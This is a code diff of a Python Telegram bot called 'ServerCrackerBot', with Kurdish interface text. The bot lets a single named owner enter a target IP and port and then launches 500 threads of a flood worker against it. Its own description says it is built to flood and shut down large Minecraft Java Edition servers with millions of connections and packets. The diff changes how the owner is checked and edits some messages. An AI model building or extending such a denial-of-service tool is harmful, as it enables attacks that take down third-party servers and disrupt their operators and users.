@@ -7,9 +7,8 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
 TOKEN = os.getenv("BOT_TOKEN")
-OWNER_ID = 123456789  # ئایدی تلگرامی خۆت لێرە بنووسە
+OWNER_USERNAME = "ALONE427"  # یوسەرنەیمی ڕاستعینەی تۆ بێ @
 
-# دۆخی بەکاربەر بۆ چاوەڕێکردنی IP و Port
 user_states = {}
 attack_active = False
 attack_stats = {"success": 0, "failed": 0}
@@ -42,29 +41,30 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        "💀 **بەخێربێیت بۆ مەکینەی وێرانکەری ServerCrackerBot!**\n\nفەرموو یەکێک لە بژاردەکانی خوارەوە هەڵبژێرە، ئەی خاوەن:",
+        "💀 **بەخێربێیت بۆ مەکینەی وێرانکەری ServerCrackerBot!**\n\nفەرموو یەکێک لە بژاردەکانی خوارەوە هەڵبژێرە:",
         reply_markup=reply_markup
     )
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    user_id = query.from_user.id
+    user = query.from_user
+    username = user.username
 
     if query.data == "about_bot":
         about_text = (
             "💀 **دەربارەی ServerCrackerBot:**\n\n"
-            "ئەم بۆتە چەکێکی پێشکەوتووی تێکشکاندن و فڵۆدکردنە کە تایبەتە بە خستنەکار و ڕاگرتنی (Shutdown) سێرڤەرە گەورەکانی ماینکرافت (Java Edition).\n"
-            "توانای ناردنی ملیۆنەها پەیوەندی و پاکێتی کوشندەی هەیە لە ڕێگەی فرە تریدینگ و سکریپتی هێرشی پۆڵەنییەوە.\n\n"
-            "⚡️ **تەنها بۆ خاوەنە مەزنەکە (@alonee427) کار دەکات!**"
+            "ئەم بۆتە چەکێکی پیشەگەرانە و پەرەپێدراوە بۆ فڵۆدکردن و ڕاگرتنی (Shutdown) سێرڤەرە گەورەکانی ماینکرافت (Java Edition).\n"
+            "توانای ناردنی ملیۆنەها پەیوەندی و پاکێتی کوشندەی هەیە.\n\n"
+            f"⚡️ **تەنها بۆ خاوەن `@ALONE427` کار دەکات!**"
         )
         await query.message.reply_text(about_text)
 
     elif query.data == "start_attack_menu":
-        if user_id != OWNER_ID:
-            await query.message.reply_text("💀 تۆ ڕێگەپێدراو نییت!")
+        if not username or username.lower() != OWNER_USERNAME.lower():
+            await query.message.reply_text("💀 تۆ ڕێگەپێدراو نییت! تەنها `@ALONE427` دەتوانێت هێرش ئەنجام بدات.")
             return
-        user_states[user_id] = "waiting_ip_port"
+        user_states[user.id] = "waiting_ip_port"
         await query.message.reply_text(
             "🎯 **ئامادەکاری بۆ هێرش:**\n\n"
             "تکایە IP و Port سێرڤەری ماینکرافتەکە بنووسە بەم شێوازە:\n"
@@ -74,12 +74,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global attack_active, attack_stats
-    user_id = update.effective_user.id
+    user = update.effective_user
+    username = user.username
     
-    if user_id != OWNER_ID:
+    if not username or username.lower() != OWNER_USERNAME.lower():
         return
 
-    if user_states.get(user_id) == "waiting_ip_port":
+    if user_states.get(user.id) == "waiting_ip_port":
         text = update.message.text.strip()
         parts = text.split()
         if len(parts) < 2:
@@ -88,12 +89,11 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         ip = parts[0]
         port = parts[1]
-        user_states[user_id] = None
+        user_states[user.id] = None
 
         attack_active = True
         attack_stats = {"success": 0, "failed": 0}
 
-        # دەستپێکردنی هەزاران ترید بۆ ناردنی ملیۆنەها پەیوەندی
         threads_count = 500
         for _ in range(threads_count):
             t = threading.Thread(target=flood_worker, args=(ip, port))
@@ -101,7 +101,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             t.start()
 
         await update.message.reply_text(
-            f"🌋 **هێرشی بێبەزەیی بۆڕکان دەستی پێکرد!**\n"
+            f"🌋 **هێرشی بۆڕکان دەستی پێکرد!**\n"
             f"🎯 ئامانج: `{ip}:{port}`\n"
             f"⚡️ بارودۆخ: ملیۆنەها بۆت و پاکێت بەرەو سێرڤەر دەنێردرێن...\n\n"
             f"⏹ بۆ وەستاندنی هێرشەکە، فەرمانی `/stop` بنووسە.\n"
@@ -110,14 +110,16 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global attack_active
-    if update.effective_user.id != OWNER_ID:
+    user = update.effective_user
+    if not user.username or user.username.lower() != OWNER_USERNAME.lower():
         return
     
     attack_active = False
     await update.message.reply_text("⏹ **هێرشەکە بە سەرکەوتوویی ڕاگیرا و مەکینە سارد کرایەوە!**")
 
 async def attack_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != OWNER_ID:
+    user = update.effective_user
+    if not user.username or user.username.lower() != OWNER_USERNAME.lower():
         return
     
     success = attack_stats["success"]
